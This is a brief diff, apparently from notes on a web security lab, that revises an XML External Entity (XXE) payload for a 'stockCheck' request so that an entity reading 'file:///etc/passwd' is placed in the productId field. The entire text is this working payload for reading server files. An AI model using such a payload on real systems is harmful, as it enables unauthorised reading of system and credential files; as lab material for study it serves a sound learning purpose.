@@ -10,15 +10,13 @@ Payload
 
 ``` <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE mydoc [ <!ENTITY payload SYSTEM "file:///etc/passwd" > ]>
-                <stockCheck><productId>&myent;</productId><storeId>1</storeId>
+                <stockCheck>
                         <productId>
-                            1
+                            &payload;
                         </productId>
                         <storeId>
                            1
                         </storeId>
-                        <myTag>
-                            &payload;
-                        </myTag>
+
                 </stockCheck>
 ```
